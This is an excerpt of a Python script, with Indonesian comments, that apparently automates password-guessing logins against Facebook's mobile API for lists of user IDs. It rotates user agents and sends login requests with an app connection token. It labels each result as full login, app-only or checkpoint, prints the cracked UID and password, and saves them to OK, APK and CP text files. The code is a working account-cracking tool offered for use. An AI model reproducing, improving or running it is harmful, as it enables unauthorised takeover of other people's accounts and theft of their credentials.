...
def login_1(uid):
    ...
    "User-Agent": str(random.choice([
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            # Kirim request login
            # ============================================
            #  LOGIN FACEBOOK (FIX + CP MODERN + APK-ONLY)
            # ============================================
            res = session.post(
            ...
            # ============================================
            # 1. LOGIN BERHASIL (SESSION_KEY MASUK)
            # ============================================
            if 'session_key' in res:
                ...
                if "c_user" in cookie_dict and "xs" in cookie_dict:
                    # FULL LOGIN (Bisa di Chrome / Browser)
                    status = "OK"
                elif "c_user" in cookie_dict and "xs" not in cookie_dict:
                    # LOGIN APK-ONLY (Tidak bisa login di Chrome)
                    status = "APK-ONLY"
                    cookie_string = ""       # Cookie tidak valid browser
                else:
                    # Cookie tidak lengkap
                    status = "CP"
                    cookie_string = ""

                # ==========================
                # PANEL TAMPILAN HASIL LOGIN
                # ==========================
                print("\n\033[92m┌" + "─"*50 + "┐")
                print(f"│ UID     : {uid:<40}│")
                print(f"│ PASS    : {pw:<40}│")
                print(f"│ YEAR    : {year:<40}│")

                if status == "OK":
                    print(f"│ STATUS  : \033[92mOK (FULL LOGIN)\033[0m{' ' * 18}│")
                elif status == "APK-ONLY":
                    print(f"│ STATUS  : \033[93mAPK-ONLY (Aplikasi saja)\033[0m{' ' * 9}│")
                else:
                    print(f"│ STATUS  : \033[91mCP (Checkpoint)\033[0m{' ' * 18}│")

                print(f"│ USER-AG : {ua[:40]:<40}│")
                print("└" + "─"*50 + "┘\033[0m")
                ...
                if status == "OK":
                    file_path = os.path.join(ok_dir, "OK.txt")
                elif status == "APK-ONLY":
                    file_path = os.path.join(apk_dir, "APK.txt")
                else:
                    file_path = os.path.join(cp_dir, "CP.txt")
            ...
            # ================================================================
            # 2. LOGIN CP (Error / Checkpoint Modern via subcode)
            # ================================================================
            error_data = res.get("error", {})
            error_msg = error_data.get("message", "")
            error_code = error_data.get("code", "")
            error_sub = error_data.get("error_subcode", "")
            ...
            if any(x in error_msg.lower() for x in CP_PATTERN) or error_sub in [1348092, 460, 459, 190]:
                ...
                print(f"│ PASS     : {pw:<40}│")
                print(f"│ YEAR     : {year:<40}│")
                print(f"│ STATUS   : CP (Checkpoint){' ' * 22}│")
                print(f"│ USER-AG  : {ua[:40]:<40}│")
                print("└" + "─"*52 + "┘\033[0m")
